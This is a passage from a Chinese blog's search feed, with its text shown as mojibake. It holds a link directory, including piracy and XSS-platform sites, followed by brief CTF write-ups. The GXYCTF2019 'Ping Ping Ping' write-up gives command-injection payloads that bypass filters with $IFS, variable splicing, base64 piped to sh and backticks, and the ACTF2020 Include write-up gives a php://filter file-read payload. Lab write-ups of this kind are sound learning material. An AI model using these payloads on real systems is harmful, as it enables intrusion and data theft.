é€š</td><td><a href="http://www.xuexi365.com/">http://www.xuexi365.com/</a></td><td></td></tr><tr><td>è¿‘ä»£å²</td><td><a href="https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html">https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html</a></td><td></td></tr><tr><td>WE learn</td><td><a href="https://course.sflep.com/">https://course.sflep.com/</a></td><td></td></tr><tr><td>æ™ºæ…§æ ‘</td><td><a href="https://www.zhihuishu.com/">https://www.zhihuishu.com/</a></td><td></td></tr><tr><td>é›¨è¯¾å ‚</td><td><a href="https://www.yuketang.cn/web">https://www.yuketang.cn/web</a></td><td></td></tr></tbody></table><h1 id="å·¥å…·ç®±"><a href="#å·¥å…·ç®±" class="headerlink" title="å·¥å…·ç®±"></a>å·¥å…·ç®±</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>çˆ±èµ„æ–™åœ¨çº¿å·¥å…·</td><td><a href="https://www.toolnb.com/">https://www.toolnb.com/</a></td><td></td></tr><tr><td>æç®€æ’ä»¶</td><td><a href="https://chrome.zzzmh.cn/">https://chrome.zzzmh.cn/</a></td><td></td></tr><tr><td>ä¾¿æ·å·¥å…·</td><td><a href="https://shulijp.com/">https://shulijp.com/</a></td><td></td></tr><tr><td>è“è°ƒ</td><td><a href="http://www.lcoc.top/">http://www.lcoc.top/</a></td><td></td></tr><tr><td>çŸ­è§†é¢‘è§£æ</td><td><a href="http://jx.xueshi.pro/">http://jx.xueshi.pro/</a></td><td></td></tr><tr><td>ç²¾å‡†äº‘å·¥å…·</td><td><a href="https://jingzhunyun.com/">https://jingzhunyun.com/</a></td><td></td></tr><tr><td>æå®šè®¾è®¡</td><td><a href="https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao">https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao</a></td><td></td></tr><tr><td>ä¸€ä¸ªå·¥å…·ç®±</td><td><a href="http://www.atoolbox.net/">http://www.atoolbox.net/</a></td><td></td></tr><tr><td>åˆé›†ç½‘</td><td><a href="http://www.heji.ltd/">http://www.heji.ltd/</a></td><td></td></tr><tr><td>åˆ›é€ è€…æ—¥æŠ¥</td><td><a href="https://creatorsdaily.com/">https://creatorsdaily.com/</a></td><td></td></tr><tr><td>åœ¨çº¿å·¥å…·</td><td><a href="https://tool.lu/">https://tool.lu/</a></td><td></td></tr><tr><td>å…”äºŒå·¥å…·ç®±</td><td><a href="https://www.tool22.com/">https://www.tool22.com/</a></td><td></td></tr></tbody></table><h1 id="å¯¼èˆª"><a href="#å¯¼èˆª" class="headerlink" title="å¯¼èˆª"></a>å¯¼èˆª</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>ä¼˜èšé›†</td><td><a href="https://ujuji.com/">https://ujuji.com/</a></td><td></td></tr><tr><td>KIM</td><td><a href="https://kim.plopco.com/">https://kim.plopco.com/</a></td><td></td></tr><tr><td>ä»Šæ—¥çƒ­æ¦œ</td><td><a href="https://tophub.today/c/ent">https://tophub.today/c/ent</a></td><td></td></tr><tr><td>AnyKnew</td><td><a href="https://www.anyknew.com/#/">https://www.anyknew.com/#/</a></td><td></td></tr><tr><td>ç‰›å¯¼èˆª</td><td><a href="http://www.ziliao6.com/">http://www.ziliao6.com/</a></td><td></td></tr><tr><td>æ²ƒå…‹å¯¼èˆª</td><td><a href="http://www.waysto.work/">http://www.waysto.work/</a></td><td></td></tr><tr><td>ç«™é•¿å•¦ç½‘ç«™ç›®å½•</td><td><a href="http://top.cnzzla.com/">http://top.cnzzla.com/</a></td><td></td></tr><tr><td>AnywhereAnything</td><td><a href="http://lackar.com/aa/">http://lackar.com/aa/</a></td><td></td></tr><tr><td>è€å¸æœºå¯¼èˆª</td><td><a href="http://www.giffox.com/">http://www.giffox.com/</a></td><td></td></tr><tr><td>å¹¿å‘Šåˆ›æ„æ–‡æ¡ˆ</td><td><a href="https://www.addog.vip/">https://www.addog.vip/</a></td><td></td></tr><tr><td>äº§å“ç»ç†å¯¼èˆª</td><td><a href="https://dh.woshipm.com/#section-1">https://dh.woshipm.com/#section-1</a></td><td></td></tr><tr><td>è€ƒæ‹‰æ–°åª’ä½“å¯¼èˆª</td><td><a href="https://www.kaolamedia.com/">https://www.kaolamedia.com/</a></td><td></td></tr><tr><td>å›½å¤–ç½‘ç«™å¤§å…¨</td><td><a href="http://www.world68.com/">http://www.world68.com/</a></td><td></td></tr><tr><td>åˆé›†ç½‘</td><td><a href="https://www.heji.ltd/">https://www.heji.ltd/</a></td><td></td></tr><tr><td>é¾™è½©</td><td><a href="http://ilxdh.com/">http://ilxdh.com/</a></td><td></td></tr><tr><td>å°ç”°ç”°</td><td><a href="https://xydh.fun/xiaotiantian">https://xydh.fun/xiaotiantian</a></td><td></td></tr><tr><td>å·¥å…·è¾¾äºº</td><td><a href="https://dartools.com/">https://dartools.com/</a></td><td></td></tr></tbody></table><h1 id="ç£åŠ›"><a href="#ç£åŠ›" class="headerlink" title="ç£åŠ›"></a>ç£åŠ›</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>å°ç™½ç§è‰</td><td><a href="https://wx.gzlpx.com.cn/">https://wx.gzlpx.com.cn/</a></td><td></td></tr><tr><td>è¶…èƒ½æœ</td><td><a href="http://www.chaonengsou.com/">http://www.chaonengsou.com/</a></td><td></td></tr><tr><td>ç½—é©¬ç›˜</td><td><a href="https://www.luomapan.com/">https://www.luomapan.com/</a></td><td></td></tr><tr><td>å¿«æœ</td><td><a href="https://search.chongbuluo.com/#nyaso">https://search.chongbuluo.com/#nyaso</a></td><td></td></tr><tr><td>é…·æœ</td><td><a href="https://www.kolsou.com/">https://www.kolsou.com/</a></td><td></td></tr><tr><td>ä¼˜èšé›†</td><td><a href="http://hao.ujuji.com/#/">http://hao.ujuji.com/#/</a></td><td></td></tr><tr><td>å°æ˜­æ¥å•¦</td><td><a href="https://www.xiaozhaolaila.com/">https://www.xiaozhaolaila.com/</a></td><td></td></tr><tr><td>å°å¯æœæœ</td><td><a href="https://www.xiaokesoso.com/">https://www.xiaokesoso.com/</a></td><td></td></tr><tr><td>å¤§åŠ›ç›˜</td><td><a href="https://www.dalipan.com/">https://www.dalipan.com/</a></td><td></td></tr><tr><td>å°˜å¿ƒèšæœç´¢</td><td><a href="https://pan.ischenxin.com/">https://pan.ischenxin.com/</a></td><td></td></tr><tr><td>è¥¿ç“œæœ</td><td><a href="http://www.xgsoso.com/">http://www.xgsoso.com/</a></td><td></td></tr><tr><td>è“å¥æœ</td><td><a href="https://www.xqxianbao.com/lzys/">https://www.xqxianbao.com/lzys/</a></td><td></td></tr><tr><td>å¤§åœ£ç›˜</td><td><a href="https://www.dashengpan.com/">https://www.dashengpan.com/</a></td><td></td></tr><tr><td>äº‘ç›˜ç²¾çµ</td><td><a href="https://www.yunpanjingling.com/">https://www.yunpanjingling.com/</a></td><td></td></tr><tr><td>äº‘é“ºå­</td><td><a href="http://www.yunpz.net/">http://www.yunpz.net/</a></td><td></td></tr><tr><td>å‘†æ²³é©¬</td><td><a href="http://www.daihema.com/">http://www.daihema.com/</a></td><td></td></tr><tr><td>ç›˜å¤©ä¸‹</td><td><a href="https://www.pantianxia.com/">https://www.pantianxia.com/</a></td><td></td></tr><tr><td>å°ç™½ç›˜</td><td><a href="https://www.xiaobaipan.com/">https://www.xiaobaipan.com/</a></td><td></td></tr><tr><td>æ˜“ç ´è§£</td><td><a href="https://www.ypojie.com/">https://www.ypojie.com/</a></td><td></td></tr><tr><td>å»è½¬ç›˜</td><td><a href="https://www.quzhuanpan.com/">https://www.quzhuanpan.com/</a></td><td></td></tr><tr><td>å·´å£«æœç´¢</td><td><a href="http://bashi5.org/">http://bashi5.org/</a></td><td></td></tr><tr><td>yamadie</td><td><a href="https://yamadie.net/">https://yamadie.net/</a></td><td></td></tr><tr><td>ttdva</td><td><a href="http://www.ttdva.com/">http://www.ttdva.com/</a></td><td></td></tr><tr><td>æ±‚èµ„æº</td><td><a href="https://www.qiuziyuan.net/">https://www.qiuziyuan.net/</a></td><td></td></tr><tr><td>é˜¿è¨å§†è½¯ä»¶</td><td><a href="https://www.sssam.com/">https://www.sssam.com/</a></td><td></td></tr><tr><td>å¤§ç™½è½¯ä»¶ç«™</td><td><a href="https://win.o--o.win/">https://win.o--o.win/</a></td><td></td></tr><tr><td>MT</td><td><a href="http://mt.indabai.com/">http://mt.indabai.com/</a></td><td></td></tr><tr><td>æ— è§£æœ</td><td><a href="http://wujiesou.com/">http://wujiesou.com/</a></td><td></td></tr><tr><td>æ‡’ç›˜</td><td><a href="https://www.lzpan.com/">https://www.lzpan.com/</a></td><td></td></tr></tbody></table><h1 id="ä¸“ä¸šï¼ˆä¼ä¸šï¼‰"><a href="#ä¸“ä¸šï¼ˆä¼ä¸šï¼‰" class="headerlink" title="ä¸“ä¸šï¼ˆä¼ä¸šï¼‰"></a>ä¸“ä¸šï¼ˆä¼ä¸šï¼‰</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>åä¸ºäº‘ç›´æ’­</td><td><a href="https://bbs.huaweicloud.com/webinar">https://bbs.huaweicloud.com/webinar</a></td><td></td></tr><tr><td>360ç½‘ç»œå®‰å…¨å­¦é™¢</td><td><a href="https://university.360.cn/">https://university.360.cn/</a></td><td></td></tr><tr><td>åä¸ºé«˜æ ¡ç³»åˆ—</td><td><a href="https://huaweicloud.bugu.mudu.tv/watch/lm06j3em">https://huaweicloud.bugu.mudu.tv/watch/lm06j3em</a></td><td></td></tr><tr><td>é˜¿é‡Œäº‘å¼€å‘ç¤¾åŒº</td><td><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></td><td></td></tr><tr><td>è…¾è®¯äº‘</td><td><a href="https://cloud.tencent.com/">https://cloud.tencent.com/</a></td><td></td></tr><tr><td>è…¾è®¯äº‘å¼€å‘è€…æ‰‹å†Œ</td><td><a href="https://cloud.tencent.com/developer/devdocs">https://cloud.tencent.com/developer/devdocs</a></td><td></td></tr></tbody></table><h1 id="åŠå…¬"><a href="#åŠå…¬" class="headerlink" title="åŠå…¬"></a>åŠå…¬</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>QQé‚®ç®±</td><td><a href="https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f">https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f</a></td><td></td></tr><tr><td>å¾é“å¹»ç¯ç‰‡</td><td><a href="https://www.woodo.cn/?f=2388">https://www.woodo.cn/?f=2388</a></td><td></td></tr><tr><td>uzer</td><td><a href="https://uzer.me/">https://uzer.me/</a></td><td></td></tr><tr><td>hippterï¼ˆPPTï¼‰</td><td><a href="http://www.hippter.com/">http://www.hippter.com/</a></td><td></td></tr></tbody></table><h1 id="å½±è§†"><a href="#å½±è§†" class="headerlink" title="å½±è§†"></a>å½±è§†</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>ç‰‡åº“</td><td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td><td></td></tr><tr><td>çœŸä¸å¡ç”µå½±ç½‘</td><td><a href="https://www.zhenbuka.com/">https://www.zhenbuka.com/</a></td><td></td></tr><tr><td>ç”µå½±é›·è¾¾</td><td><a href="http://m.dianyingleida.com/">http://m.dianyingleida.com/</a></td><td></td></tr><tr><td>é£˜èŠ±å½±é™¢</td><td><a href="http://www.phyy1.com/">http://www.phyy1.com/</a></td><td></td></tr><tr><td>å­¦å£«çˆ±è§£æ</td><td><a href="http://jiexi.xueshi.pro/">http://jiexi.xueshi.pro/</a></td><td></td></tr><tr><td>èšBT</td><td><a href="https://jubt.net/cn/index.html">https://jubt.net/cn/index.html</a></td><td></td></tr><tr><td>åŠ¨æ¼«</td><td><a href="https://qinmei.video/">https://qinmei.video/</a></td><td></td></tr><tr><td>è›‹è›‹èµå½±é™¢</td><td><a href="https://www.dandanzan.com/">https://www.dandanzan.com/</a></td><td></td></tr><tr><td>ç”µå½±ç‹—</td><td><a href="http://www.dianyinggou.com/linkNav/">http://www.dianyinggou.com/linkNav/</a></td><td></td></tr><tr><td>VIP</td><td><a href="http://vip.sb/">http://vip.sb/</a></td><td></td></tr></tbody></table><h1 id="æ–‡åº“ä¸‹è½½"><a href="#æ–‡åº“ä¸‹è½½" class="headerlink" title="æ–‡åº“ä¸‹è½½"></a>æ–‡åº“ä¸‹è½½</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>å—ç“œæ–‡æ¡£</td><td><a href="http://www.588230.com/#wenku">http://www.588230.com/#wenku</a></td><td></td></tr><tr><td>åŒ—æ–—ç™¾åº¦æ–‡åº“ä¸‹è½½</td><td><a href="http://www.bdwenku.com/">http://www.bdwenku.com/</a></td><td></td></tr></tbody></table><h1 id="ç¤¾åŒº"><a href="#ç¤¾åŒº" class="headerlink" title="ç¤¾åŒº"></a>ç¤¾åŒº</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>å“”å“©å“”å“©</td><td><a href="https://www.bilibili.com/">https://www.bilibili.com/</a></td><td></td></tr><tr><td>å¾®äº‘</td><td><a href="https://www.weiyun.com/">https://www.weiyun.com/</a></td><td></td></tr><tr><td>ç™¾åº¦äº‘</td><td><a href="https://pan.baidu.com/">https://pan.baidu.com</a></td><td></td></tr><tr><td>è“å¥äº‘</td><td><a href="https://lanzou.com/">https://lanzou.com/</a></td><td></td></tr><tr><td>çŸ¥ä¹</td><td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td><td></td></tr><tr><td>è™ç‰™</td><td><a href="https://www.huya.com/">https://www.huya.com/</a></td><td></td></tr></tbody></table><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>è·¯è¿‡å›¾åºŠ</td><td><a href="https://imgchr.com/">https://imgchr.com/</a></td><td></td></tr><tr><td>èšåˆå›¾åºŠ</td><td><a href="https://www.superbed.cn/">https://www.superbed.cn/</a></td><td></td></tr><tr><td>æ²¹çŒ´</td><td><a href="https://greasyfork.org/zh-CN">https://greasyfork.org/zh-CN</a></td><td></td></tr><tr><td>æ’ä»¶</td><td><a href="https://www.extfans.com/">https://www.extfans.com/</a></td><td></td></tr><tr><td>äº‘çŸ­ä¿¡</td><td><a href="https://www.materialtools.com/">https://www.materialtools.com/</a></td><td></td></tr><tr><td>ä¸´æ—¶é‚®ç®±</td><td><a href="https://10minutemail.net/">https://10minutemail.net/</a></td><td></td></tr><tr><td>äº‘çŸ­ä¿¡2</td><td><a href="https://yunduanxin.net/">https://yunduanxin.net/</a></td><td></td></tr><tr><td>PDFè½¬</td><td><a href="https://www.cleverpdf.com/cn">https://www.cleverpdf.com/cn</a></td><td></td></tr><tr><td>PDF</td><td><a href="https://lightpdf.cn/">https://lightpdf.cn/</a></td><td></td></tr><tr><td>alltoall</td><td><a href="https://www.alltoall.net/">https://www.alltoall.net/</a></td><td></td></tr></tbody></table><h1 id="é¶åœº-æ¸—é€"><a href="#é¶åœº-æ¸—é€" class="headerlink" title="é¶åœº  æ¸—é€"></a>é¶åœº  æ¸—é€</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>iæ˜¥ç§‹</td><td><a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></td><td></td></tr><tr><td>æ”»é˜²ä¸–ç•Œ</td><td><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></td><td></td></tr><tr><td>Wechall</td><td><a href="http://www.wechall.net/">http://www.wechall.net/</a></td><td></td></tr><tr><td>Wargame</td><td><a href="http://www.wargame.kr/">http://www.wargame.kr/</a></td><td></td></tr><tr><td>æ¸—é€å¸ˆ</td><td><a href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></td><td></td></tr><tr><td>å°è¿ªæ¸—é€</td><td><a href="http://www.xiaodi8.com/">http://www.xiaodi8.com/</a></td><td></td></tr><tr><td>MD5</td><td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td><td></td></tr><tr><td>XSSå¹³å°</td><td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td><td></td></tr><tr><td>sourceforge</td><td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td><td></td></tr><tr><td>æŸ¥IP</td><td><a href="https://site.ip138.com/raw.githubusercontent.com/">https://site.ip138.com/raw.githubusercontent.com/</a></td><td></td></tr><tr><td>BUUCTF</td><td><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr></tbody></table><h1 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>CSDN</td><td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td><td></td></tr><tr><td>ç‰‡åº“</td><td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td><td></td></tr><tr><td>çŸ¥ä¹</td><td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td><td></td></tr><tr><td>èœé¸Ÿ</td><td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td><td></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019 Ping Ping Ping</title>
      <link href="/2021/03/01/gxyctf2019-ping-ping-ping/"/>
      <url>/2021/03/01/gxyctf2019-ping-ping-ping/</url>
      
        <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>è¿›å»å…³é”®å­—æ˜¯IP,getä¼ å‚ ip=127.0.0.1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯»å–ç›®å½•ä¸‹æ–‡ä»¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>ls<span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•è¯»å–flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>cat<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token operator">?</span>ip<span class="token operator">=</span> fxck your space<span class="token operator">!</span><span class="token comment">//ç©ºæ ¼è¢«ban</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»•è¿‡ç©ºæ ¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$1flag</span><span class="token operator">.</span>php<span class="token operator">?</span>ip<span class="token operator">=</span> fxck your flag<span class="token operator">!</span><span class="token comment">//flagè¢«ban</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¯»å–index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$1index</span><span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\{|\}/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//è¡¨è¾¾å¼ .* å°±æ˜¯å•ä¸ªå­—ç¬¦åŒ¹é…ä»»æ„æ¬¡ï¼Œå³è´ªå©ªåŒ¹é…ã€‚ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸ºä¾‹ï¼ša.*bï¼Œå®ƒå°†ä¼šåŒ¹é…æœ€é•¿çš„ä»¥aå¼€å§‹ï¼Œä»¥bç»“æŸçš„å­—ç¬¦ä¸²ã€‚å¦‚æœç”¨å®ƒæ¥æœç´¢aababçš„è¯ï¼Œå®ƒä¼šåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²aababã€‚è¿™è¢«ç§°ä¸ºè´ªå©ªåŒ¹é…</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å­—ç¬¦</p><p>å˜é‡æ‹¼æ¥</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>a<span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span><span class="token operator">.</span>php<span class="token comment">//æŸ¥çœ‹æºä»£ç å¯å‘ç°flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>shå‘½ä»¤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token variable">$IFS</span><span class="token variable">$9Y2F0IGZsYWcucGhwCg</span><span class="token operator">==</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">|</span><span class="token variable">$IFS</span><span class="token variable">$9base64</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">-</span><span class="token class-name type-declaration">d</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">|</span><span class="token variable">$IFS</span><span class="token variable">$9sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å†…è”æ‰§è¡Œ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token string backtick-quoted-string">`ls`</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_æ–°ç”Ÿèµ› Include</title>
      <link href="/2021/03/01/actf2020-xin-sheng-sai-include/"/>
      <url>/2021/03/01/actf2020-xin-sheng-sai-include/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çˆ†å‡ºåŠ å¯†åæºä»£ç åè§£å¯†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_æ–°ç”Ÿèµ› Exec</title>
      <link href="/2021/03/01/actf2020-xin-sheng-sai-exec/"/>
      <url>/2021/03/01/actf2020-xin-sheng-sai-exec/</url>
      
